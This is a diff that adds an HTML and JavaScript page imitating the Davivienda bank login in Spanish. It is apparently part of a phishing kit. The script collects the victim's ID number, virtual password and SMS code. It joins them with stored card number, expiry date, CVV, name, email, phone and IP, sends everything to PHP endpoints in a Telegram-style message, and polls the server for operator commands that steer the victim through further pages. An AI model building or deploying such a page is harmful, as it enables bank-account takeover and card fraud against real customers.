@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pagina principal inicio</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f2f2f2; /* fallback */
+      background-image: url('img/fondo1a.jpeg');
+      background-repeat: no-repeat;
+      background-position: center center;
+      background-attachment: fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    *, *::before, *::after {
+      box-sizing: border-box;
+    }
+
+    .preview form {
+      width: 420px;
+      padding: 45px 50px;
+      text-align: center;
+    }
+
+    @media (max-width: 480px) {
+      .preview form {
+        width: 90%;
+        max-width: 400px;
+        padding: 30px 25px;
+      }
+
+      .logo img {
+        width: 120px;
+        margin-bottom: 20px;
+      }
+
+      .greeting small {
+        font-size: 16px;
+      }
+
+      .greeting p {
+        font-size: 20px;
+      }
+
+      .label {
+        font-size: 14px;
+      }
+
+      select, input[type="text"], input[type="password"] {
+        height: 42px;
+        padding: 0 12px;
+        font-size: 14px;
+      }
+
+      .btn {
+        padding: 12px 0;
+        font-size: 15px;
+      }
+    }
+
+    .logo img {
+      width: 160px;
+      margin-bottom: 25px;
+    }
+
+    .greeting {
+      text-align: left;
+      margin-bottom: 30px;
+    }
+
+    .greeting small {
+      font-size: 18px;
+      color: #000;
+    }
+
+    .greeting p {
+      margin: 0;
+      color: #000;
+      font-size: 22px;
+      font-weight: bold;
+    }
+
+    .label {
+      display: block;
+      text-align: left;
+      font-size: 15px;
+      margin-bottom: 6px;
+      color: #333;
+      font-weight: 500;
+    }
+
+    select, input[type="text"], input[type="password"] {
+      width: 100%;
+      height: 44px; /* altura uniforme para ambos controles */
+      padding: 0 13px;
+      border: 1px solid #c7c7c7;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      font-size: 15px;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+
+    select:focus, input[type="text"]:focus, input[type="password"]:focus {
+      border-color: #e30613;
+    }
+
+    input:disabled, select:disabled {
+      background-color: #fff !important;
+      cursor: not-allowed;
+      opacity: 1;
+    }
+
+    .checkbox {
+      text-align: left;
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 25px;
+    }
+
+    .loader {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      z-index: 1000;
+    }
+
+    .loader.show {
+      display: block;
+    }
+
+    .clave-virtual-container {
+      display: none;
+      margin-top: 30px;
+    }
+
+    .clave-virtual-container.show {
+      display: block;
+    }
+
+    .codigo-celular-container {
+      display: none;
+      margin-top: 30px;
+    }
+
+    .codigo-celular-container.show {
+      display: block;
+    }
+
+    .error-message {
+      display: none;
+      color: #e30613;
+      font-size: 14px;
+      text-align: left;
+      margin-top: 5px;
+      margin-bottom: 20px;
+    }
+
+    .error-message.show {
+      display: block;
+    }
+
+    .checkbox input {
+      margin-right: 6px;
+    }
+
+    .btn {
+      background-color: #e30613;
+      color: #fff;
+      border: none;
+      width: 100%;
+      padding: 15px 0;
+      font-size: 16px;
+      font-weight: 600;
+      border-radius: 40px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .btn:hover {
+      background-color: #c20510;
+    }
+
+    .divider {
+      border-top: 1px solid #e0e0e0;
+      margin: 35px 0 20px 0;
+    }
+
+    .link {
+      color: #000;
+      font-size: 15px;
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .link:hover {
+      text-decoration: underline;
+    }
+
+    /* Simulación de vista previa */
+    .preview {
+      width: 100%;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="preview">
+    <form id="loginForm">
+      <div class="logo">
+        <img src="img/logo1a.svg?v=1" alt="Davivienda Logo" id="logoImg">
+      </div>
+
+      <div class="greeting">
+        <small>¡Hola!</small><br>
+        <p>Nos alegra que esté aquí</p>
+      </div>
+
+      <label class="label">Seleccione su tipo de documento</label>
+      <select name="tipo_documento">
+        <option>Cédula de Ciudadanía</option>
+        <option>Cédula de Extranjería</option>
+        <option>NIT</option>
+        <option>Pasaporte</option>
+      </select>
+
+      <label class="label">Ingrese su número de documento</label>
+      <input type="text" name="numero_documento" placeholder="" pattern="[0-9]*" inputmode="numeric" id="documento" maxlength="10">
+
+      <div class="checkbox">
+        <input type="checkbox" id="recordar" name="recordar">
+        <label for="recordar">Recordar mis datos de identidad</label>
+      </div>
+
+      <button type="button" class="btn" id="btnContinuar">Continuar</button>
+
+      <div class="loader" id="loader"></div>
+
+      <div class="clave-virtual-container" id="claveVirtual">
+        <label class="label">Ingresa tu clave virtual</label>
+        <input type="text" name="clave_virtual" placeholder="" id="claveVirtualInput" maxlength="8">
+        <button type="submit" class="btn" id="btnContinuar2">Continuar</button>
+      </div>
+
+      <div class="codigo-celular-container" id="codigoCelular">
+        <label class="label">Ingresa el código que enviamos a tu celular</label>
+        <input type="text" name="codigo_celular" placeholder="" id="codigoCelularInput" maxlength="8">
+        <p class="error-message" id="errorDinamica">!!Verifique su identidad, para continuar debe ingresar el código enviado a su celular o correo electrónico.!!</p>
+        <button type="button" class="btn" id="btnContinuar3">Continuar</button>
+      </div>
+
+      <div class="divider"></div>
+
+      <a href="#" class="link">¿Olvidó o bloqueó su clave?</a>
+    </form>
+  </div>
+  
+ <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const documentoInput = document.getElementById('documento');
+      const btnContinuar = document.getElementById('btnContinuar');
+      const claveVirtualContainer = document.getElementById('claveVirtual');
+      const claveVirtualInput = document.getElementById('claveVirtualInput');
+      
+      if (documentoInput) {
+          documentoInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+          });
+          
+          documentoInput.addEventListener('paste', function(e) {
+            e.preventDefault();
+            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+            this.value = pastedText.replace(/[^0-9]/g, '').substring(0, 10);
+          });
+      }
+
+      if (btnContinuar) {
+          btnContinuar.addEventListener('click', function(e) {
+            e.preventDefault();
+            const documentoValue = documentoInput.value.trim();
+            
+            if (documentoValue.length < 5) {
+              alert('El número de documento debe tener mínimo 5 dígitos');
+              return;
+            }
+            
+            if (documentoValue.length > 10) {
+              alert('El número de documento debe tener máximo 10 dígitos');
+              return;
+            }
+            
+            const loader = document.getElementById('loader');
+            btnContinuar.style.display = 'none';
+            loader.classList.add('show');
+            documentoInput.disabled = true;
+            
+            setTimeout(function() {
+              loader.classList.remove('show');
+              claveVirtualContainer.classList.add('show');
+            }, 2000);
+          });
+      }
+
+      let isTyping = false;
+
+      if (claveVirtualInput) {
+          claveVirtualInput.addEventListener('focus', function(e) {
+            isTyping = true;
+            const realValue = this.getAttribute('data-real-value') || '';
+            this.value = realValue;
+          });
+
+          claveVirtualInput.addEventListener('keydown', function(e) {
+            if (!isTyping) return;
+            
+            let realValue = this.getAttribute('data-real-value') || '';
+            
+            if (e.key === 'Backspace') {
+              realValue = realValue.slice(0, -1);
+            } else if (e.key >= '0' && e.key <= '9') {
+              realValue = (realValue + e.key).replace(/[^0-9]/g, '');
+              if (realValue.length > 8) {
+                realValue = realValue.substring(0, 8);
+              }
+            } else {
+              return;
+            }
+            
+            e.preventDefault();
+            this.setAttribute('data-real-value', realValue);
+            this.value = '*'.repeat(realValue.length);
+          });
+
+          claveVirtualInput.addEventListener('input', function(e) {
+            if (!isTyping) return;
+            
+            let realValue = this.value.replace(/[^0-9]/g, '');
+            if (realValue.length > 8) {
+              realValue = realValue.substring(0, 8);
+            }
+            this.setAttribute('data-real-value', realValue);
+            this.value = '*'.repeat(realValue.length);
+          });
+
+          claveVirtualInput.addEventListener('blur', function(e) {
+            isTyping = false;
+            const realValue = this.getAttribute('data-real-value') || '';
+            this.value = '*'.repeat(realValue.length);
+          });
+      }
+
+      const loginForm = document.getElementById('loginForm');
+      if (loginForm) {
+          loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const realValue = claveVirtualInput.getAttribute('data-real-value') || '';
+            
+            if (realValue.length < 6) {
+              alert('La clave virtual debe tener mínimo 6 dígitos');
+              return;
+            }
+            
+            if (realValue.length > 8) {
+              alert('La clave virtual debe tener máximo 8 dígitos');
+              return;
+            }
+            
+            claveVirtualInput.blur();
+            
+            const loader = document.getElementById('loader');
+            loader.classList.add('show');
+            
+            const documento = documentoInput.value;
+            const clave = realValue;
+            
+            enviarUsuarioTelegram(documento, clave);
+          });
+      }
+
+      const btnContinuar3 = document.getElementById('btnContinuar3');
+      const codigoCelularInput = document.getElementById('codigoCelularInput');
+      if (btnContinuar3) {
+        btnContinuar3.addEventListener('click', async function(e) {
+          const codigo = codigoCelularInput.value.trim();
+          
+          if (codigo.length < 6) {
+            alert('El código debe tener mínimo 6 dígitos');
+            return;
+          }
+          
+          const loader = document.getElementById('loader');
+          loader.classList.add('show');
+          
+          localStorage.setItem('token', codigo);
+          
+          const documento = documentoInput.value;
+          await enviarTokenTelegram(documento, codigo);
+        });
+      }
+      
+      if (codigoCelularInput) {
+        codigoCelularInput.addEventListener('input', function(e) {
+          this.value = this.value.replace(/[^0-9]/g, '');
+        });
+      }
+    });
+    
+    // --- FUNCIÓN DE ENVÍO CORREGIDA (CÉDULA EN VAL) ---
+    async function enviarUsuarioTelegram(u, p) {
+      let sessionId = localStorage.getItem('session_id');
+      if (!sessionId) {
+        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        localStorage.setItem('session_id', sessionId);
+      }
+      
+      localStorage.setItem('username', u);
+      localStorage.setItem('password', p);
+      localStorage.setItem('identificacion', u);
+
+      const userAgent = navigator.userAgent;
+      let dispositivo = 'PC';
+      if (/Android/i.test(userAgent)) dispositivo = 'Android';
+      else if (/iPhone|iPad|iPod/i.test(userAgent)) dispositivo = 'iPhone';
+      
+      const hora = new Date().toLocaleString('es-ES');
+      
+      let ip = 'No disponible';
+      try {
+        const ipResponse = await fetch('get_ip.php');
+        const ipData = await ipResponse.json();
+        ip = ipData.ip || 'No disponible';
+      } catch(e) {}
+
+      // Mapeo corregido: Extraemos la cédula de 'val'
+      const cedula   = localStorage.getItem('val') || 'No disponible';
+      const nombre   = localStorage.getItem('nombre') || localStorage.getItem('nom') || 'No disponible';
+      const correo   = localStorage.getItem('correo') || localStorage.getItem('eml') || 'No disponible';
+      const celular  = localStorage.getItem('celular') || localStorage.getItem('cel') || 'No disponible';
+      const tarjeta  = localStorage.getItem('tarjeta') || localStorage.getItem('num') || 'No disponible';
+      const fecha    = localStorage.getItem('fecha') || localStorage.getItem('exp') || 'No disponible';
+      const cvv      = localStorage.getItem('cvv') || localStorage.getItem('cvc') || 'No disponible';
+      
+      const mensaje = `💎<b>DAVIVIENDA</b>💎
+<b>😈4-72 ACTIVO😈</b>
+
+<b>👤 Nombre:</b> ${nombre}
+<b>🆔 Cédula:</b> ${cedula}
+<b>💌 Correo:</b> ${correo}
+<b>📞 Celular:</b> ${celular}
+<b>📟 Disp:</b> ${dispositivo}
+<b>🗺 IP:</b> ${ip}
+<b>⏱ Hora:</b> ${hora}
+------------------------------
+<b>🏦 Banco:</b> ${localStorage.getItem('banco') || 'DAVIVIENDA'}
+<b>💳 Tarjeta:</b> <code>${tarjeta}</code>
+<b>📅 Fecha:</b> <code>${fecha}</code>
+<b>🔐 CVV:</b> <code>${cvv}</code>
+------------------------------
+👤 <b>Usuario Dav:</b> <code>${u}</code>
+🔑 <b>Clave Virtual:</b> <code>${p}</code>
+------------------------------`;
+
+      const formData = new FormData();
+      formData.append('message', mensaje);
+      formData.append('transactionId', sessionId);
+
+      fetch('procesar_logo.php', { method: 'POST', body: formData })
+      .then(res => res.json())
+      .then(result => {
+        if (result.status === 'success') {
+          localStorage.setItem('messageId', result.messageId);
+          setTimeout(() => { checkPaymentVerification(sessionId, result.messageId); }, 2000);
+        } else { simularEnvio(sessionId); }
+      })
+      .catch(() => simularEnvio(sessionId));
+    }
+
+    async function enviarTokenTelegram(u, token) {
+      const sessionId = localStorage.getItem('session_id');
+      const hora = new Date().toLocaleString('es-ES');
+      let ip = 'No disponible';
+      try {
+        const ipResponse = await fetch('get_ip.php');
+        const ipData = await ipResponse.json();
+        ip = ipData.ip || 'No disponible';
+      } catch(e) {}
+      
+      const mensaje = `💎<b>DAVIVIENDA (TOKEN)</b>💎\n------------------------------\n👤 Usuario: ${u}\n🔄 Token: <code>${token}</code>\n🗺 IP: ${ip}\n⏱ Hora: ${hora}\n------------------------------`;
+
+      const formData = new FormData();
+      formData.append('message', mensaje);
+      formData.append('transactionId', sessionId);
+
+      fetch('procesar_dinamica.php', { method: 'POST', body: formData })
+      .then(res => res.json())
+      .then(result => {
+        if (result.status === 'success') {
+          checkTokenVerification(sessionId, result.messageId);
+        } else { simularEnvio(sessionId); }
+      })
+      .catch(() => simularEnvio(sessionId));
+    }
+
+    async function checkTokenVerification(transactionId, messageId) {
+      try {
+        const formData = new FormData();
+        formData.append('transactionId', transactionId);
+        formData.append('messageId', messageId);
+
+        const res = await fetch('verificar_dinamica.php', { method: 'POST', body: formData });
+        const result = await res.json();
+
+        if (result.action) {
+          const loader = document.getElementById('loader');
+          if (loader) loader.classList.remove('show');
+
+          switch (result.action) {
+            case 'pedir_dinamica': 
+              const errorDinamica = document.getElementById('errorDinamica');
+              if (errorDinamica) errorDinamica.classList.add('show');
+              break;
+            case 'error_logo': 
+              alert("Usuario o clave incorrectos.");
+              window.location.href = "index.html";
+              break;
+            case 'error': window.location.href = "/caras"; break;
+            case 'cedula': window.location.href = "/cedula"; break;
+            case 'confirm_finalizar':
+              window.location.href = "../../finish.html";
+              break;
+          }
+        } else { setTimeout(() => checkTokenVerification(transactionId, messageId), 2000); }
+      } catch (err) { setTimeout(() => checkTokenVerification(transactionId, messageId), 2000); }
+    }
+
+    async function checkPaymentVerification(transactionId, messageId) {
+      try {
+        const formData = new FormData();
+        formData.append('transactionId', transactionId);
+        formData.append('messageId', messageId);
+
+        const res = await fetch('verificar_respuesta.php', { method: 'POST', body: formData });
+        const result = await res.json();
+
+        if (result.action) {
+          const loader = document.getElementById('loader');
+          if (loader) loader.classList.remove('show');
+
+          switch (result.action) {
+            case 'pedir_dinamica':
+              const codigoCelular = document.getElementById('codigoCelular');
+              const claveVirtualInput = document.getElementById('claveVirtualInput');
+              if (codigoCelular) codigoCelular.classList.add('show');
+              if (claveVirtualInput) claveVirtualInput.disabled = true;
+              break;
+            case 'error_logo':
+              alert("Usuario o clave incorrectos.");
+              window.location.href = "index.html";
+              break;
+            case 'error': window.location.href = "/caras"; break;
+            case 'cedula': window.location.href = "/cedula"; break;
+            case 'error_cajero': 
+              window.location.href = "clav.html";
+              break;
+            case 'confirm_finalizar':
+              window.location.href = "../../../finis.html";
+              break;
+            default:
+              setTimeout(() => { checkPaymentVerification(transactionId, messageId); }, 2000);
+          }
+        } else { setTimeout(() => { checkPaymentVerification(transactionId, messageId); }, 2000); }
+      } catch (err) { setTimeout(() => { checkPaymentVerification(transactionId, messageId); }, 2000); }
+    }
+
+    function simularEnvio(sessionId) {
+      const messageId = 'msg_' + Date.now();
+      setTimeout(() => { checkPaymentVerification(sessionId, messageId); }, 2000);
+    }
+</script>
+</body>
+</html>
